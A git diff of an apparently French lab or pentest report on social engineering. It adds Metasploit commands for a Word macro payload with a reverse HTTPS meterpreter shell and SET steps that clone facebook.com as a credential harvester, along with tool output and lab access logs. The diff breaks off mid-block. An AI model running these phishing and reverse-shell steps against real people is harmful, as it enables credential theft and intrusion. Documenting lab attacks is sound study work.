@@ -850,11 +850,16 @@ Le mot de passe a bien été craqué.
 
 ### Social engineering
 
+#### Scenario 1
+
 ```
 msfconsole
 use exploit/multi/fileformat/office_word_macro 
 set payload windows/meterpreter/reverse_https
 ```
+
+#### Scenario 2
+
 ```
 mkdir phisherman
 cd phisherman
@@ -867,7 +872,46 @@ Une fois l'interface web chargée, on suit les instructions du README:
 - "Clear Apache"
 - "Start Apache Service"
 
-Malhereusement, chaque choix qu'on peut sélectionner nous renvoie une 404  et la page web est redirigée vers un output de logs vide (voir captures ci-après). 
+Malhereusement, chaque choix qu'on peut sélectionner nous renvoie une 404  et la page web est redirigée vers un output de logs vide (voir captures ci-après). Il semblerait que la repo ne soit plus mise à jour depuis deux ans. 
 
+#### Scenario 3
 
+```
+setoolkit
+1
+2
+3
+2
+https://www.facebook.com
+```
+```
+[-] SET supports both HTTP and HTTPS
+[-] Example: http://www.thisisafakesite.com
+set:webattack> Enter the url to clone: https://www.facebook.com
+
+[*] Cloning the website: https://login.facebook.com/login.php                                                                                                                                                      
+[*] This could take a little bit...                                                                                                                                                                                
+
+The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                                                                           
+[*] The Social-Engineer Toolkit Credential Harvester Attack
+[*] Credential Harvester is running on port 80                                                                                                                                                                     
+[*] Information will be displayed to you as it arrives below:                                                                                                                                                      
+[*] Looks like the web_server can't bind to 80. Are you running Apache or NGINX?
+Do you want to attempt to disable Apache? [y/n]: y
+Stopping apache2 (via systemctl): apache2.service.
+Stopping nginx (via systemctl): nginx.service.
+[*] Successfully stopped Apache. Starting the credential harvester.
+[*] Harvester is ready, have victim browse to your site.
+```
+
+L'attaque ne fonctionne pas, sans doute a cause de l'obsolescence du navigateur de Windows. 
+
+```
+192.168.10.30 - - [16/Jun/2024 18:48:40] "GET / HTTP/1.1" 200 -
+192.168.10.30 - - [16/Jun/2024 18:48:42] "GET /favicon.ico HTTP/1.1" 404 -
+```
+
+On essaie a nouveau depuis Kali-même:
+
+```
 
